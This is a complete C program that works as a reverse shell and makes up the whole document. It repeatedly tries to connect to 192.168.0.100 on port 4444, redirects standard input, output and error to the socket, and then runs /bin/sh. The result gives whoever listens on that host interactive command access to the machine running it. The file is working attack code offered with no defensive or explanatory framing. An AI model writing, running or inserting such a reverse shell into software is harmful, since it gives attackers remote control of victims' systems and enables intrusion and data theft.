#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>  // Added for strerror
#include <errno.h>

int main() {
    int sock;
    struct sockaddr_in addr = {0};
    int retries = 10;
    int delay = 2; // Seconds between retries

    while (retries > 0) {
        // Create a TCP socket
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            perror("socket");
            return 1;
        }

        // Set up the remote address
        addr.sin_family = AF_INET;
        addr.sin_port = htons(4444);
        addr.sin_addr.s_addr = inet_addr("192.168.0.100");

        // Attempt to connect
        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            break; // Connection successful
        }

        fprintf(stderr, "connect failed: %s, retrying (%d left)\n", strerror(errno), retries);
        close(sock);
        sleep(delay);
        retries--;
    }

    if (retries == 0) {
        fprintf(stderr, "All connection attempts failed\n");
        return 1;
    }

    // Redirect stdin, stdout, and stderr to the socket
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    // Execute /bin/sh
    execl("/bin/sh", "/bin/sh", NULL);

    perror("execl");
    close(sock);
    return 1;
}
